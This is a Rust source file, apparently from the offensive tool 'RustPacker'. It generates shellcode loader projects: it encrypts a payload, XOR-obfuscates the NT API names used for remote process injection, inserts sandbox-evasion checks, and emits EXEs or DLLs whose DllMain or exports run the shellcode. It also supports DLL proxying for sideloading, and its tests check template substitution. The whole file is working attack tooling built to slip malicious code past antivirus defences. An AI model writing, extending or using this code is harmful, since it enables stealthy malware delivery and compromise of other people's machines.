//! Generator module for RustPacker
//!
//! This module handles the generation of Rust code for shellcode loaders.

use crate::config::{Encryption, Execution, Format, Order};
use crate::obfuscation::{non_zero_random_key, obfuscate_api_name, obfuscate_string_for_template};
use crate::sandbox::build_sandbox;
use anyhow::{Context, Result};
use fs_extra::dir::{copy, CopyOptions};
use std::collections::HashMap;
use std::fs::{self, OpenOptions};
use std::io::prelude::*;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

const OUTPUT_DIR: &str = "shared";
const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";

fn build_dependencies(template_dependencies: Option<String>) -> String {
    match template_dependencies {
        Some(deps) if !deps.trim().is_empty() => format!("{}\n{}", LITCRYPT_DEPENDENCY, deps),
        _ => LITCRYPT_DEPENDENCY.to_string(),
    }
}

fn search_and_replace(path: &Path, search: &str, replace: &str) -> Result<()> {
    let content = fs::read_to_string(path).with_context(|| {
        format!(
            "Failed to read template file for replacement: {}",
            path.display()
        )
    })?;
    let new_content = content.replace(search, replace);
    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(path)
        .with_context(|| {
            format!(
                "Failed to open template file for writing: {}",
                path.display()
            )
        })?;
    file.write_all(new_content.as_bytes())
        .with_context(|| format!("Failed to write replaced template file: {}", path.display()))?;
    Ok(())
}

fn create_output_folder() -> Result<PathBuf> {
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .context("System clock before UNIX epoch")?
        .as_secs();
    let folder_name = format!("output_{}", timestamp);
    println!("[+] Creating output folder: {}", folder_name);
    let path = Path::new(OUTPUT_DIR).join(folder_name);
    fs::create_dir(&path)
        .with_context(|| format!("Failed to create output folder: {}", path.display()))?;
    Ok(path)
}

fn copy_template(source: &Path, dest: &Path) -> Result<()> {
    let options = CopyOptions {
        content_only: true,
        ..Default::default()
    };
    copy(source, dest, &options).context("Failed to copy template directory")?;
    Ok(())
}

fn get_template_path(execution: &Execution) -> PathBuf {
    Path::new("templates").join(format!("{}/.", execution.template_name()))
}

fn get_encrypted_filename(encryption: &Encryption) -> &'static str {
    match encryption {
        Encryption::Xor => "input.xor",
        Encryption::Aes => "input.aes",
        Encryption::Uuid => "input.uuid",
    }
}

fn build_encrypted_output(
    order: &Order,
    src_dir: &Path,
) -> Result<(crate::encryption::EncryptionOutput, String)> {
    let filename = get_encrypted_filename(&order.encryption);
    let path = src_dir.join(filename);
    let include_path = format!("\"{}\"", filename);
    let output =
        crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption)
            .context("Failed to encrypt shellcode")?;
    Ok((output, include_path))
}

fn build_basic_replacements(
    enc_output: crate::encryption::EncryptionOutput,
    include_path: String,
) -> HashMap<&'static str, String> {
    let dependencies = build_dependencies(enc_output.dependencies);
    let mut replacements = HashMap::new();
    replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
    replacements.insert("{{MAIN}}", enc_output.main);
    replacements.insert("{{DEPENDENCIES}}", dependencies);
    replacements.insert("{{IMPORTS}}", enc_output.imports.unwrap_or_default());
    replacements.insert("{{LITCRYPT_SETUP}}", LITCRYPT_SETUP.to_string());
    replacements.insert("{{DLL_MAIN}}", String::new());
    replacements.insert("{{DLL_FORMAT}}", String::new());
    replacements
}

fn add_target_process_replacement(replacements: &mut HashMap<&'static str, String>, target: &str) {
    replacements.insert("{{TARGET_PROCESS}}", obfuscate_string_for_template(target));
}

fn add_sandbox_replacements(replacements: &mut HashMap<&'static str, String>, domain: &str) {
    let sandbox_output = build_sandbox(domain);
    replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
    replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
}

fn add_api_obfuscation_replacements(replacements: &mut HashMap<&'static str, String>) {
    let key = non_zero_random_key();
    replacements.insert("{{API_KEY}}", format!("0x{:02x}", key));
    replacements.insert(
        "{{OBF_NT_OPEN_PROCESS}}",
        obfuscate_api_name("NtOpenProcess", key),
    );
    replacements.insert(
        "{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtAllocateVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_WRITE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtWriteVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtProtectVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_CREATE_THREAD_EX}}",
        obfuscate_api_name("NtCreateThreadEx", key),
    );
    replacements.insert(
        "{{OBF_NT_QUEUE_APC_THREAD}}",
        obfuscate_api_name("NtQueueApcThread", key),
    );
    replacements.insert(
        "{{OBF_NT_TEST_ALERT}}",
        obfuscate_api_name("NtTestAlert", key),
    );
    replacements.insert(
        "{{OBF_NT_DELAY_EXECUTION}}",
        obfuscate_api_name("NtDelayExecution", key),
    );
}

fn build_replacements(order: &Order, src_dir: &Path) -> Result<HashMap<&'static str, String>> {
    let (enc_output, include_path) = build_encrypted_output(order, src_dir)?;
    let mut replacements = build_basic_replacements(enc_output, include_path);
    add_target_process_replacement(&mut replacements, &order.target_process);

    // Always add sandbox replacements (empty if no sandbox specified)
    if let Some(ref domain) = order.sandbox {
        add_sandbox_replacements(&mut replacements, domain);
    } else {
        replacements.insert("{{SANDBOX}}", String::new());
        replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
    }

    add_api_obfuscation_replacements(&mut replacements);
    Ok(replacements)
}

fn build_dll_main_function(is_proxy: bool) -> String {
    if is_proxy {
        r#"
    const DLL_PROCESS_ATTACH: u32 = 1;
    const DLL_PROCESS_DETACH: u32 = 0;

    #[no_mangle]
    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
    extern "system" fn DllMain(
        dll_module: usize,
        call_reason: u32,
        _: *mut ())
        -> bool
    {
        match call_reason {
            DLL_PROCESS_ATTACH => {
                unsafe { proxy::init(); }
                main();
            }
            DLL_PROCESS_DETACH => (),
            _ => ()
        }

        true
    }"#
        .to_string()
    } else {
        r#"
    const DLL_PROCESS_ATTACH: u32 = 1;
    const DLL_PROCESS_DETACH: u32 = 0;

    #[no_mangle]
    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
    extern "system" fn DllMain(
        dll_module: usize,
        call_reason: u32,
        _: *mut ())
        -> bool
    {
        match call_reason {
            DLL_PROCESS_ATTACH => (),
            DLL_PROCESS_DETACH => (),
            _ => ()
        }

        true
    }
    #[no_mangle]
    pub extern "C" fn DllRegisterServer() { main() }
    #[no_mangle]
    pub extern "C" fn DllGetClassObject() { main() }
    #[no_mangle]
    pub extern "C" fn DllUnregisterServer() { main() }
    #[no_mangle]
    pub extern "C" fn Run() { main() }"#
            .to_string()
    }
}

fn apply_dll_format(
    replacements: &mut HashMap<&'static str, String>,
    main_rs_path: &Path,
    is_proxy: bool,
) -> Result<PathBuf> {
    let dll_config = "\n[lib]\ncrate-type = [\"cdylib\"]";
    replacements.insert("{{DLL_FORMAT}}", dll_config.to_string());
    replacements.insert("{{DLL_MAIN}}", build_dll_main_function(is_proxy));

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    fs::rename(main_rs_path, &lib_rs_path).with_context(|| {
        format!(
            "Failed to rename main.rs to lib.rs: {}",
            main_rs_path.display()
        )
    })?;
    Ok(lib_rs_path)
}

fn apply_replacements(
    replacements: &HashMap<&str, String>,
    main_path: &Path,
    cargo_path: &Path,
) -> Result<()> {
    for (key, value) in replacements {
        search_and_replace(main_path, key, value)
            .with_context(|| format!("Template replacement failed for key '{}'", key))?;
        search_and_replace(cargo_path, key, value)
            .with_context(|| format!("Cargo.toml replacement failed for key '{}'", key))?;
    }
    Ok(())
}

fn find_proxy_insert_position(content: &str) -> usize {
    content
        .find("use_litcrypt!();")
        .map(|pos| {
            let after = pos + "use_litcrypt!();".len();
            content[after..]
                .find('\n')
                .map(|n| after + n + 1)
                .unwrap_or(after)
        })
        .unwrap_or_else(|| {
            content
                .lines()
                .take_while(|line| line.trim().starts_with("#!") || line.trim().is_empty())
                .map(|l| l.len() + 1)
                .sum::<usize>()
                .min(content.len())
        })
}

fn apply_proxy_config(order: &Order, folder: &Path) -> Result<()> {
    let proxy_path = order
        .proxy_dll
        .as_ref()
        .ok_or_else(|| anyhow::anyhow!("Proxy DLL path is None when applying proxy config"))?;
    let exports = crate::pe_parser::parse_exports(proxy_path)
        .map_err(anyhow::Error::msg)
        .context("Failed to parse proxy DLL exports")?;

    if exports.is_empty() {
        eprintln!("[-] Warning: proxy DLL has no exports");
    }

    let stem = crate::pe_parser::dll_stem(proxy_path);
    let proxy_output = crate::dll_proxy::generate_proxy(&exports, &stem);

    let src_dir = folder.join("src");
    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source)
        .context("Failed to write proxy.rs")?;

    let lib_rs_path = src_dir.join("lib.rs");
    let content = fs::read_to_string(&lib_rs_path)
        .with_context(|| format!("Failed to read lib.rs: {}", lib_rs_path.display()))?;
    let insert_pos = find_proxy_insert_position(&content);
    let updated = format!(
        "{}\n#[allow(non_upper_case_globals, non_snake_case)]\nmod proxy;\n{}",
        &content[..insert_pos],
        &content[insert_pos..]
    );
    fs::write(&lib_rs_path, updated)
        .with_context(|| format!("Failed to write updated lib.rs: {}", lib_rs_path.display()))?;

    println!(
        "[+] DLL proxying: {} exports forwarded. Rename the original DLL to '{}'",
        exports.len(),
        proxy_output.original_dll_name
    );
    Ok(())
}

/// Generate Rust loader code from order configuration
pub fn assemble(order: Order) -> Result<PathBuf> {
    println!("[+] Assembling Rust code..");

    let template_path = get_template_path(&order.execution);
    let folder = create_output_folder()?;
    copy_template(&template_path, &folder)?;

    let src_dir = folder.join("src");
    let main_rs = src_dir.join("main.rs");
    let cargo_toml = folder.join("Cargo.toml");

    let mut replacements = build_replacements(&order, &src_dir)?;

    let is_proxy = order.proxy_dll.is_some();
    let target_file = match order.format {
        Format::Dll => apply_dll_format(&mut replacements, &main_rs, is_proxy)?,
        Format::Exe => main_rs,
    };

    apply_replacements(&replacements, &target_file, &cargo_toml)?;

    if is_proxy {
        apply_proxy_config(&order, &folder)?;
    }

    println!("[+] Done assembling Rust code!");
    Ok(folder)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{Encryption, Execution};

    #[test]
    fn test_build_dependencies() {
        assert_eq!(build_dependencies(None), r#"litcrypt = "0.4""#);
        assert_eq!(
            build_dependencies(Some(r#"libaes = "0.7""#.to_string())),
            "litcrypt = \"0.4\"\nlibaes = \"0.7\""
        );
    }

    #[test]
    fn test_get_template_path() {
        let path = get_template_path(&Execution::NtCreateRemoteThread);
        assert!(path.to_string_lossy().contains("templates/ntCRT"));
    }

    #[test]
    fn test_get_encrypted_filename() {
        assert_eq!(get_encrypted_filename(&Encryption::Xor), "input.xor");
        assert_eq!(get_encrypted_filename(&Encryption::Aes), "input.aes");
        assert_eq!(get_encrypted_filename(&Encryption::Uuid), "input.uuid");
    }

    #[test]
    fn test_build_basic_replacements() {
        let enc_output = crate::encryption::EncryptionOutput {
            decryption_function: "fn dec()".to_string(),
            main: "main()".to_string(),
            dependencies: Some("dep = \"1.0\"".to_string()),
            imports: Some("use std::;".to_string()),
        };
        let replacements = build_basic_replacements(enc_output, "input.xor".to_string());
        assert!(replacements.contains_key("{{PATH_TO_SHELLCODE}}"));
        assert!(replacements.contains_key("{{DECRYPTION_FUNCTION}}"));
    }

    #[test]
    fn test_add_target_process_replacement() {
        let mut replacements = HashMap::new();
        add_target_process_replacement(&mut replacements, "notepad.exe");
        assert!(replacements.contains_key("{{TARGET_PROCESS}}"));
    }

    #[test]
    fn test_add_api_obfuscation_replacements() {
        let mut replacements = HashMap::new();
        add_api_obfuscation_replacements(&mut replacements);
        assert!(replacements.contains_key("{{API_KEY}}"));
        assert!(replacements.contains_key("{{OBF_NT_OPEN_PROCESS}}"));
    }

    #[test]
    fn test_build_dll_main_function() {
        let proxy_main = build_dll_main_function(true);
        let non_proxy_main = build_dll_main_function(false);
        assert!(proxy_main.contains("proxy::init()"));
        assert!(!non_proxy_main.contains("proxy::init()"));
    }

    #[test]
    fn test_find_proxy_insert_position() {
        let source = "#![windows_subsystem = \"windows\"]\n\n#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();\n\nuse std::include_bytes;\n";
        let pos = find_proxy_insert_position(source);
        assert!(source[..pos].contains("use_litcrypt!();"));
    }

    use crate::config::{Format, Order};
    use std::path::Path;

    /// All template × encryption × format combinations that assemble() must
    /// turn into a fully-substituted, compilable Rust project.
    ///
    /// This is the integration filet: a regression in the templating contract
    /// (a forgotten placeholder, a renamed template variable) would otherwise
    /// only surface as a cryptic `cargo build` failure on the Windows target
    /// at the very end of the pipeline.
    fn all_combinations() -> Vec<(Execution, Encryption, Format)> {
        let executions = [
            Execution::NtQueueUserAPC,
            Execution::NtCreateRemoteThread,
            Execution::SysCreateRemoteThread,
            Execution::WinCreateRemoteThread,
            Execution::WinFiber,
            Execution::NtFiber,
            Execution::SysFiber,
            Execution::EarlyCascade,
        ];
        let encryptions = [Encryption::Xor, Encryption::Aes, Encryption::Uuid];
        let formats = [Format::Exe, Format::Dll];

        let mut combos = Vec::new();
        for &e in &executions {
            for &enc in &encryptions {
                for &f in &formats {
                    combos.push((e, enc, f));
                }
            }
        }
        combos
    }

    /// Scan a generated file for any leftover `{{...}}` template placeholder.
    fn assert_no_placeholders(label: &str, path: &Path) {
        let content =
            fs::read_to_string(path).unwrap_or_else(|e| panic!("read {label} {}: {e}", path.display()));
        let leftovers: Vec<&str> = content
            .lines()
            .filter(|line| line.contains("{{") && line.contains("}}"))
            .collect();
        assert!(
            leftovers.is_empty(),
            "{label} {} contains unsubstituted placeholders:\n{}",
            path.display(),
            leftovers.join("\n")
        );
    }

    /// Build an Order pointing at a shellcode file in `dir`.
    fn make_order(
        shellcode: &Path,
        execution: Execution,
        encryption: Encryption,
        format: Format,
    ) -> Order {
        Order {
            shellcode_path: shellcode.to_path_buf(),
            format,
            execution,
            encryption,
            target_process: "notepad.exe".to_string(),
            sandbox: None,
            output: None,
            proxy_dll: None,
        }
    }

    #[test]
    fn test_assemble_leaves_no_template_placeholders() {
        // assemble() resolves `templates/` relative to the CWD and writes to
        // `shared/` relative to the CWD. Isolate the test in a tempdir that
        // mirrors the project layout so it never touches the real repo.
        let dir = std::env::temp_dir().join("rustpacker_test_assemble_integration");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        // Copy the real templates/ so the contract tested matches production.
        // CWD during `cargo test` is the crate dir, so resolve the workspace
        // root from CARGO_MANIFEST_DIR (rustpacker-core -> parent is the root
        // that holds templates/).
        let workspace_root = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
        let templates_src = workspace_root.join("templates");
        let options = fs_extra::dir::CopyOptions {
            content_only: false,
            ..Default::default()
        };
        fs_extra::dir::copy(&templates_src, &dir, &options).unwrap();

        // assemble() writes generated projects under ./shared/ (relative to CWD).
        fs::create_dir_all(dir.join("shared")).unwrap();

        let shellcode = dir.join("shellcode.bin");
        fs::write(&shellcode, [0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8]).unwrap();

        let original_dir = std::env::current_dir().unwrap();
        std::env::set_current_dir(&dir).unwrap();

        for (execution, encryption, format) in all_combinations() {
            // create_output_folder() names folders by second-precision timestamp,
            // so separate iterations by >1s to avoid same-second collisions.
            std::thread::sleep(std::time::Duration::from_millis(1100));
            let order = make_order(&shellcode, execution, encryption, format);
            let folder = assemble(order).expect("assemble should succeed");

            let src_dir = folder.join("src");
            let source_file = if matches!(format, Format::Dll) {
                src_dir.join("lib.rs")
            } else {
                src_dir.join("main.rs")
            };
            let cargo_toml = folder.join("Cargo.toml");

            assert!(source_file.exists(), "source file missing for {execution}/{encryption}/{format}");
            assert!(cargo_toml.exists(), "Cargo.toml missing for {execution}/{encryption}/{format}");

            assert_no_placeholders("source", &source_file);
            assert_no_placeholders("Cargo.toml", &cargo_toml);

            let enc_name = get_encrypted_filename(&encryption);
            assert!(
                src_dir.join(enc_name).exists(),
                "encrypted payload missing for {execution}/{encryption}/{format}"
            );
        }

        std::env::set_current_dir(&original_dir).unwrap();
        let _ = fs::remove_dir_all(&dir);
    }

}
